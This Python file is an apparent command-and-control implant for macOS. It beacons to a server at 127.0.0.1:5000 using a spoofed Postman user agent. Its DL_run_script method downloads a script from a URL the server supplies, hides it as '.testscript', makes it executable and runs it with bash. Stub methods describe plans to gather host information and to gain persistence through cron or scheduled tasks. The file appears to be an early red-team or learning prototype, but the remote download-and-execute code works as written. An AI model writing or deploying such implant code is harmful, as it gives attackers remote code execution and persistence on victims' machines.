import requests
import json
import os
import subprocess


class PythonAgent(object):
	agent_info = {}

	def initial_information(self):
		sw_vers = subprocess.run(['sw_vers'],stdout=subprocess.PIPE,)
		if sw_vers.returncode == 0:
				self.osinfo = sw_vers.stdout.decode('utf-8')
				self.osinfo = self.osinfo.split(" ")
				print(self.osinfo)


	def check_in(self):
		url = "http://127.0.0.1:5000/check_in"

		payload = "{\n\t\"uid\":\"123456789\",\n\t\"OS\":\"MACOS\",\n\t\"antivirus\":\"Defender\",\n\t\"ip\": \"9.9.9.9\"\n}"
		headers = {
		    'Content-Type': "application/json",
		    'User-Agent': "PostmanRuntime/7.19.0",
		    'Host': "127.0.0.1:5000"
		    }
		response = requests.request("POST", url, data=payload, headers=headers)
		self.command = response.json()
		return self.command

	def DL_run_script(self,command_list):
		url = command_list['url']
		getIt = requests.get(url) ## url passed by server

		with open(".testscript","wb") as f:
			f.write(getIt.content)
		f.close()
		 ## download file 


		## add execute permissions to file
		chmod = subprocess.run(['chmod','+x','.testscript'],stdout=subprocess.PIPE,)

		print('returncode:', chmod.returncode)
		print('Have {} bytes in stdout:\n{}'.format(len(chmod.stdout),chmod.stdout.decode('utf-8')))
		print(chmod.stdout.decode('utf-8'))

		## execute file
		completed= subprocess.run(['bash','-c','./.testscript'],stdout=subprocess.PIPE,)
		print('returncode:', completed.returncode)
		print('Have {} bytes in stdout:\n{}'.format(len(completed.stdout),completed.stdout.decode('utf-8')))
		print(completed.stdout.decode('utf-8'))


	def gather_information(self):
		print("Gather info then post to server")


	def persistence(self):
		print("attempt to obtain persistence by cron or scheldued task, if successful post to server")



agent = PythonAgent()
agent.initial_information()